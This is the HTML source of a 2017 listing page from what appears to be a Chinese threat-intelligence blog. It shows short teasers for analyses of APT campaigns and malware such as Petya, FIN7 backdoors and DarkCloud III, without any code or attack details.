<!DOCTYPE html><html data-n-head="" data-n-head-ssr><meta data-n-head="true" charset="utf-8"><meta data-n-head="true" content="width=device-width,initial-scale=1" name="viewport"><meta data-n-head="true" content="Nuxt.js project" name="description" data-hid="description"><title data-n-head="true">360威胁情报中心</title><link href="/fav.ico" rel="icon" data-n-head="true" type="image/x-icon"><link href="/_nuxt/manifest.863edfce59f0a00ce608.js" rel="preload" as="script"><link href="/_nuxt/vendor.bundle.21224f443c6ee9ce918d.js" rel="preload" as="script"><link href="/_nuxt/nuxt.bundle.b8b247420f15d35e36d4.js" rel="preload" as="script"><link href="/_nuxt/0.nuxt.bundle.2df9fec90221d3916af4.js" rel="prefetch"><link href="/_nuxt/1.nuxt.bundle.a78c0d1fcdf1a526e7b5.js" rel="prefetch"><link href="/_nuxt/2.nuxt.bundle.f39815f9942bae29e5fd.js" rel="prefetch"><link href="/_nuxt/3.nuxt.bundle.7f40b4df92fe73eb8bcb.js" rel="prefetch"><style data-vue-ssr-id="1cbf7f39:0 198c0e1e:0 1ccd31a2:0 ba3a09e0:0 ad307d5e:0 2e5c82ca:0 5dc9682e:0 01cb4693:0 69b5e360:0 ec18e8da:0">.progress[data-v-862bdd9c]{position:fixed;top:0;left:0;right:0;height:2px;width:0;-webkit-transition:width .2s,opacity .4s;-o-transition:width .2s,opacity .4s;transition:width .2s,opacity .4s;opacity:1;background-color:#efc14e;z-index:999999}.hljs ::-webkit-scrollbar{width:8px;height:10px;border-radius:2px;background-color:#839496}.hljs ::-webkit-scrollbar-track{background-color:#bebebe}.hljs ::-webkit-scrollbar-thumb,.hljs ::-webkit-scrollbar-track{border-radius:2px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.hljs ::-webkit-scrollbar-thumb{background-color:#789}html{font-family:Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:16px;word-spacing:1px;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-box-sizing:border-box;box-sizing:border-box}body{background-color:rgba(66,66,66,.05)}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;text-decoration:none}a:active,a:hover,a:link,a:visited{color:#0b1802}.main-body h1,.main-body h2,.main-body h3,.main-body h4,.main-body h5,.main-body h6{margin-top:0;margin-bottom:.5rem}.main-body p{margin-top:0;margin-bottom:1rem;font-size:15px;text-indent:25px;word-wrap:break-word}.main-body img{vertical-align:middle;border-style:none;margin:auto 20px auto auto;padding:3px;border-radius:3px;background-color:#e6e6d5;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.15);box-shadow:0 1px 2px rgba(0,0,0,.15);border:1px solid #b9baa6}.main-body .text-center{text-align:center!important}.main-body table{border-collapse:collapse!important;width:100%;max-width:100%;margin:1em 0;background-color:transparent}.main-body table tbody+tbody{border-top:2px solid #e9ecef}.main-body table td,.main-body table th{padding:.5rem;font-size:.95em;text-align:center;border-collapse:collapse}.main-body table tr{border:1px solid #dfe8fe}.main-body table tr:nth-child(odd){background-color:#ecf1fe}.main-body table tr:nth-child(2n){background-color:#fdfdfd}.main-body table td{white-space:normal;word-break:break-all}.main-body code,.main-body kbd,.main-body pre,.main-body samp{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.container[data-v-6762fd4c]{margin:0 auto;max-width:1450px}.nav-bar[data-v-42857612]{height:60px;border-bottom:1px solid #d5d5d5}.nav-bar .ico-favicon[data-v-42857612]{height:28px;margin-top:16px;margin-left:108px;cursor:pointer}.nav-bar .ico-home[data-v-42857612]{display:inline-block;margin:16px;float:right}.disPic .pic[data-v-42857612]{background-color:#faa732;height:480px;width:100%}.disPic[data-v-94c37b20]{background:url(/_nuxt/img/banner2.87c117d.jpg);background-repeat:no-repeat;background-size:cover;height:480px}.disPic .text[data-v-94c37b20]{color:#fff;text-align:center}.disPic .line1[data-v-94c37b20]{font-family:Microsoft YaHei;font-weight:700;font-size:60px;padding-top:142px}.disPic .line2[data-v-94c37b20]{font-family:Microsoft YaHei;font-weight:400;margin-top:46px;font-size:30px}.disPic .line3[data-v-94c37b20]{margin-top:51px;font-size:20px;font-family:LilyUPC;white-space:pre}.left-con[data-v-a7c4b6ea]{height:100%;width:100%;float:left}.main-part[data-v-a7c4b6ea]{margin-right:348px}.art-list[data-v-a7c4b6ea],.paging[data-v-a7c4b6ea]{margin:20px 20px auto 108px}.paging[data-v-a7c4b6ea]{padding-bottom:20px;border-bottom:1px solid #efefef}.paging .pag-btn[data-v-a7c4b6ea]{line-height:40px;height:40px;color:#53addd;text-align:center;width:180px;border:1px solid #53addd;border-radius:2px;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;font-size:14px}.paging .pag-btn .ico[data-v-a7c4b6ea]{width:14px;height:14px;padding-top:13px;display:inline-block;background-size:14px;background-repeat:no-repeat}.paging .pag-btn p[data-v-a7c4b6ea]{display:inline-block}.paging .btn-unable[data-v-a7c4b6ea],.paging .btn-unable[data-v-a7c4b6ea]:hover,.paging .pag-btn[data-v-a7c4b6ea]:active,.paging .pag-btn[data-v-a7c4b6ea]:hover{color:#fff}.paging .pag-btn[data-v-a7c4b6ea]:hover{background-color:#72c4f0;border-bottom:1px solid #72c4f0}.paging .pag-btn[data-v-a7c4b6ea]:active{background-color:#409ed0}.paging .btn-unable[data-v-a7c4b6ea],.paging .btn-unable[data-v-a7c4b6ea]:hover{background-color:#dadee5;border:1px solid #dadee5;cursor:not-allowed}.paging .left[data-v-a7c4b6ea]{float:left}.paging .left p[data-v-a7c4b6ea]{padding-left:7px}.paging .right[data-v-a7c4b6ea]{float:right}.paging .right p[data-v-a7c4b6ea]{padding-right:7px}.paging .mid[data-v-a7c4b6ea]{text-align:center;line-height:40px;height:40px;color:#979996;margin:auto 200px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:default}@media screen and (min-width:550px) and (max-width:950px){.main-part .paging[data-v-a7c4b6ea],.main-part[data-v-a7c4b6ea]{margin-right:108px}.main-part .paging .left[data-v-a7c4b6ea],.main-part .paging .right[data-v-a7c4b6ea]{width:25%}.main-part .paging .mid[data-v-a7c4b6ea]{margin:auto 30%}}@media screen and (min-width:200px) and (max-width:550px){.main-part[data-v-a7c4b6ea],.paging[data-v-a7c4b6ea]{margin:20px 40px}.main-part .art-list[data-v-a7c4b6ea],.paging .art-list[data-v-a7c4b6ea]{margin:0}.paging .left[data-v-a7c4b6ea],.paging .right[data-v-a7c4b6ea]{width:25%}.paging .mid[data-v-a7c4b6ea]{margin:auto 30%}}.art-container[data-v-4113267b]{margin-top:16px;padding-bottom:16px;width:100%;height:216px;position:relative;border-bottom:1px solid #deded7}.art-container .text-box[data-v-4113267b]{margin-left:320px;top:0}.art-container .text-box .brief[data-v-4113267b]{text-indent:25px;display:-webkit-box;-webkit-line-clamp:4;-webkit-box-orient:vertical;overflow:hidden}.art-container .text-box .href[data-v-4113267b]{cursor:pointer;color:#53addd;text-indent:25px}.art-container .text-box .author[data-v-4113267b]{display:inline-block;line-height:32px}.art-container .text-box .author img[data-v-4113267b]{width:16px;height:16px}.art-container .pic-box[data-v-4113267b]{width:300px;max-height:200px;border-radius:5px;position:absolute;display:inline-block;top:0;overflow:hidden}.art-container .pic-box img[data-v-4113267b]{width:100%}@media screen and (min-width:950px) and (max-width:1250px){.art-container .text-box[data-v-4113267b]{margin-left:10px}.art-container .pic-box[data-v-4113267b]{width:0}}@media screen and (min-width:200px) and (max-width:950px){.art-container .text-box[data-v-4113267b]{margin-left:10px}.art-container .pic-box[data-v-4113267b]{width:0}}.title-home[data-v-552f8598]{font-family:sans-serif;line-height:32px;font-size:24px;color:#0b1802;cursor:pointer}.title-home[data-v-552f8598]:hover{text-shadow:2px 3px 1px #d0d0d0}.title-detail[data-v-552f8598]{font-size:48px;color:#0b1802;font-family:Arial Rounded MT Bold;margin-top:48px;line-height:64px}@media screen and (min-width:550px) and (max-width:950px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}@media screen and (max-width:550px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}.tags[data-v-53a17526]{height:42px;padding-top:10px}.tag[data-v-53a17526]{background-color:#6aacd8;display:inline-block;height:22px;font-size:13px;color:#fefefe;font-family:sans-serif;padding:2px 6px;margin-right:8px;border-radius:2px}.tag[data-v-83f11450]{width:220px;float:left;margin-top:50px;margin-left:-311px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.tag .tag-header[data-v-83f11450]{cursor:pointer;height:40px;line-height:40px;text-align:center;font-size:15px;color:#494b48;font-weight:700;font-family:monospace}.tag .tag-header .tag-header[data-v-83f11450]{width:110px;height:40px;border:1px solid #efefef;background-color:#fafafa}.tag .tag-header .tag-header[data-v-83f11450]:hover{background-color:#66bcff;color:#fff;border:1px solid #66bcff}.tag .tag-header .h-chosen[data-v-83f11450]{color:#fff;background-color:#47afff;border:1px solid #47afff}.tag .tag-header .h-left[data-v-83f11450]{float:left}.tag .tag-header .h-right[data-v-83f11450]{overflow:hidden}.tag .tag-body[data-v-83f11450]{border:1px solid #efefef;border-bottom-left-radius:1px;border-bottom-right-radius:1px}.tag .tag-body .tag-list[data-v-83f11450]{padding:10px;margin-bottom:0;cursor:pointer}.tag .tag-body .tag-list .tag-item[data-v-83f11450]{padding:2px 8px;color:#0b1802;font-size:13px;list-style:none}.tag .tag-body .tag-list .tag-item a[data-v-83f11450]{padding:4px;border-radius:2px;display:inline-block}.tag .tag-body .tag-list .item-chosen a[data-v-83f11450]{color:#fff;background-color:#53addd}.tag .tag-body .tag-list .tag-item:hover a[data-v-83f11450]{color:#fff;background-color:#72c4f0}@media screen and (min-width:550px) and (max-width:950px){.tag[data-v-83f11450]{visibility:hidden}}@media screen and (max-width:550px){.tag[data-v-83f11450]{visibility:hidden}}</style><body data-n-head=""><div data-server-rendered="true" id="__nuxt"><div class="progress" data-v-862bdd9c style="width:0%;height:2px;background-color:#3b8070;opacity:0"></div><div><section data-v-6762fd4c><div data-v-42857612 data-v-6762fd4c><div class="nav-bar" data-v-42857612><a href="/" data-v-42857612><img src="/_nuxt/img/blog-icon.f80549d.png" class="ico-favicon" data-v-42857612></a><a href="/" data-v-42857612><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABYklEQVRYR+2Vy1HDMBCGV5sG0oLH3EkHkA78CHUAHdABtMCZyHEHdgnmHo8pIQ1kxcgTh+DRY20fAjPWTaOV/s//PizgyktcWR9mgP/rQLRrlkj0qGuIEN/zOPgaU0+jHIh2zQqJCgGw1KIK4ECI6zwOqqEQgwH64p3gWIhBADbxKRBsgFPOm852m9VDnWABaPHFkQoQsOLk+AQR5HFw8MV7AYaKnwUVVMdFW5hOCCfAaPGfovBCWAEmizMhrACJrCsBcOvLIevckQ4jQCLrJwHwynqcGaQAnrM0fOuH/00ATbn5aO7bMYtUMD/SGCYI1/pg+xCUpgBvG6ayVqaLCuATQJ1bTIC4M8XJNHRqjAboP2wDnQFmByY7kMh9aapwThHqTsnS0PkH9XfBdh+BELt+i3EAQKlYbm5y1xzxAnRDiZDawdStLA1fLveJrH/tkbC0DZ/LeyyAKZPQd3cGmB34BjX7xSHXvTXWAAAAAElFTkSuQmCC" class="ico-home" data-v-42857612></a></div><div class="disPic" data-v-42857612 data-v-94c37b20><p class="text line1" data-v-94c37b20>数据驱动安全<p class="text line2" data-v-94c37b20>360威胁情报研究<p class="text line3" data-v-94c37b20>———————— T H R E A T I N T E L L I G E N C E B A S E D O N D A T A A N D A N A L Y S I S ————————</div></div><div class="container" data-v-6762fd4c><div class="left-con" data-v-a7c4b6ea data-v-6762fd4c><div class="main-part" data-v-a7c4b6ea><div class="art-list" data-v-a7c4b6ea><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/07/31/8102c0ab69bdb893c5c5a0dde724ee80.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/gaza-cybergang-apt-sample" tag="div" data-v-552f8598>Gaza Cybergang APT团伙新样本分析</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>APT<p class="tag" data-v-53a17526>GAZA</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2017-07-27 , admin ,专题报告</div><div class="brief" data-v-4113267b>2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。 <a href="/articles/gaza-cybergang-apt-sample" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/07/30/5abbf430bedd308ef9d6ff5623ee2961.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/analysis-of-petya-boot-code" tag="div" data-v-552f8598>Petya变种勒索蠕虫启动代码分析</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>MBR<p class="tag" data-v-53a17526>PETYA</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2017-07-27 , admin ,专题报告</div><div class="brief" data-v-4113267b>继5月的WannaCry勒索蠕虫事件以后，2017年6月又出现了Petya变种勒索蠕虫，除了利用永恒之蓝漏洞和加密勒索以后，Petya变种与WannaCry有比较大的差别。WannaCry会加密机器上的文件，导致数据损毁，而Petya更为激进，它会加密系统的MBR直接导致机器无法启动，本文对其执行的MBR及文件系统的加密机制做详细的分析。 <a href="/articles/analysis-of-petya-boot-code" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/045f27711e5726f442f4f4f6e4c20244.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/Template_Injection_Attack_Behind_Template_Threat" tag="div" data-v-552f8598>Template Injection 攻击事件: 隐藏在模板文件后的威胁</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>DOCX<p class="tag" data-v-53a17526>TEMPLATE INJECTION<p class="tag" data-v-53a17526>OFFICE</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2017-07-14 , admin ,专题报告</div><div class="brief" data-v-4113267b>《纽约时报》和彭博社上周透露，联邦调查局和国土安全部发布了一份联合报告称：美国的制造工厂、核电站和其他能源设施正遭受网络攻击的威胁。此次袭击至少攻击了美国十几家电力公司，包括在堪萨斯州的 Wolf Creek核设施。 随后，思科Talos情报和研究小组称，最近攻击者在针对美国能源设施和其他重要基础设施组织的攻击中使用了一种叫做模板注入（Template Injection）的技术。 360天眼实验室针对此次事件中使用到的恶意样本进行了一些技术分析，详细分析了Template Injection所有可能用到的攻击技术，并且通过关联分析追溯到此次攻击最早可能发生在今年3月。 <a href="/articles/Template_Injection_Attack_Behind_Template_Threat" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="/_nuxt/img/pic-1.3c14cf9.jpg" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/fin7-apt-campaign-backdoor-analysis" tag="div" data-v-552f8598>FIN7 APT组织攻击木马分析报告</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>FIN7<p class="tag" data-v-53a17526>APT<p class="tag" data-v-53a17526>BACKDOOR</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2017-06-19 , admin ,专题报告</div><div class="brief" data-v-4113267b>2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。 <a href="/articles/fin7-apt-campaign-backdoor-analysis" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/f8ac5e02af0e3da2ff7436f8250cd7a9.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/darkcloud3-botnet-technical-analysis" tag="div" data-v-552f8598>暗云III木马技术分析报告</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>DARKCLOUD<p class="tag" data-v-53a17526>暗云3<p class="tag" data-v-53a17526>暗云</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2017-06-14 , admin ,专题报告</div><div class="brief" data-v-4113267b>2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。 <a href="/articles/darkcloud3-botnet-technical-analysis" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/b0f7f0d4156f5b3fb0a153345e16f289.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/fireball-adware-analysis" tag="div" data-v-552f8598>浏览器变造者流氓推广软件分析</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>FIREBALL<p class="tag" data-v-53a17526>ADWARE</div><div class="author" data-v-4113267b><a data-v-4113267b><img 